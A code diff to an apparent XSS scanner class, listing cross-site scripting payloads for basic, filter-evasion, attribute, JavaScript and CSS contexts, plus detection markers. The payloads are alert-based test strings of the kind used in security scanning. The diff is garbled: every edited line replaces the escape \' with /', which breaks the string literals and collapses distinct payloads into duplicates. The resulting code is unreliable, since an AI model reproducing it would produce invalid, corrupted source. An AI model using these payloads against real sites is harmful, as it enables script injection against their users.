@@ -13,52 +13,52 @@ class XSSAnalyzer {
         '<script>alert("XSS")</script>',
         '<img src=x onerror=alert("XSS")>',
         '<svg onload=alert("XSS")>',
-        '<iframe src="javascript:alert(\'XSS\')">',
+        '<iframe src="javascript:alert(/'XSS\')">',
         '<body onload=alert("XSS")>',
         '<input onfocus=alert("XSS") autofocus>',
         '<select onfocus=alert("XSS") autofocus>',
         '<textarea onfocus=alert("XSS") autofocus>',
         '<keygen onfocus=alert("XSS") autofocus>',
-        '<video><source onerror="alert(\'XSS\')">'
+        '<video><source onerror="alert(/'XSS\')">'
       ],
       
       // 绕过过滤器的载荷
       evasion: [
         '<ScRiPt>alert("XSS")</ScRiPt>',
         '<script>alert(String.fromCharCode(88,83,83))</script>',
-        '<img src="javascript:alert(\'XSS\')">', 
+        '<img src="javascript:alert(/'XSS\')">', 
         '<img src=# onerror=alert("XSS")>',
         '<img src=/ onerror=alert("XSS")>',
         '<img src="" onerror=alert("XSS")>',
         '<img src=x:alert(alt) onerror=eval(src) alt="XSS">',
-        '<img src="x" onerror="alert(\'XSS\')">',
+        '<img src="x" onerror="alert(/'XSS\')">',
         '<svg><script>alert("XSS")</script></svg>',
-        '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">'
+        '<math><mi//xlink:href="data:x,<script>alert(/'XSS\')</script>">'
       ],
       
       // 属性注入
       attribute: [
-        '" onmouseover="alert(\'XSS\')"',
-        '\' onmouseover=\'alert("XSS")\'',
-        '" onfocus="alert(\'XSS\')" autofocus="',
-        '\' onfocus=\'alert("XSS")\' autofocus=\'',
-        '" onclick="alert(\'XSS\')"',
-        '\' onclick=\'alert("XSS")\'',
+        '" onmouseover="alert(/'XSS\')"',
+        '/' onmouseover=\'alert("XSS")/'',
+        '" onfocus="alert(/'XSS\')" autofocus="',
+        '/' onfocus=\'alert("XSS")/' autofocus=\'',
+        '" onclick="alert(/'XSS\')"',
+        '/' onclick=\'alert("XSS")/'',
         '"><script>alert("XSS")</script>',
-        '\'><script>alert("XSS")</script>',
+        '/'><script>alert("XSS")</script>',
         '"><img src=x onerror=alert("XSS")>',
-        '\'><img src=x onerror=alert("XSS")>'
+        '/'><img src=x onerror=alert("XSS")>'
       ],
       
       // JavaScript上下文
       javascript: [
         'alert("XSS")',
-        '\';alert("XSS");//',
-        '\";alert("XSS");//',
+        '/';alert("XSS");//',
+        '/';alert("XSS");//',
         '</script><script>alert("XSS")</script>',
         '});alert("XSS");//',
-        '\\\';alert(String.fromCharCode(88,83,83));//',
-        '\\\";alert(String.fromCharCode(88,83,83));//'
+        '///';alert(String.fromCharCode(88,83,83));//',
+        '///';alert(String.fromCharCode(88,83,83));//'
       ],
       
       // CSS上下文
@@ -67,7 +67,7 @@ class XSSAnalyzer {
         'expression(alert("XSS"))',
         'javascript:alert("XSS")',
         'behavior:url(javascript:alert("XSS"))',
-        '-moz-binding:url("data:text/xml;charset=utf-8,<bindings xmlns=\\"http://www.mozilla.org/xbl\\"><binding><implementation><constructor>alert(\\"XSS\\")</constructor></implementation></binding></bindings>")'
+        '-moz-binding:url("data:text/xml;charset=utf-8,<bindings xmlns=//"http://www.mozilla.org/xbl\\"><binding><implementation><constructor>alert(//"XSS\\")</constructor></implementation></binding></bindings>")'
       ]
     };
     
@@ -75,7 +75,7 @@ class XSSAnalyzer {
     this.detectionMarkers = [
       'XSS_TEST_MARKER_',
       'alert("XSS")',
-      'alert(\'XSS\')',
+      'alert(/'XSS\')',
       'alert(`XSS`)',
       'console.log("XSS")',
       'document.write("XSS")'
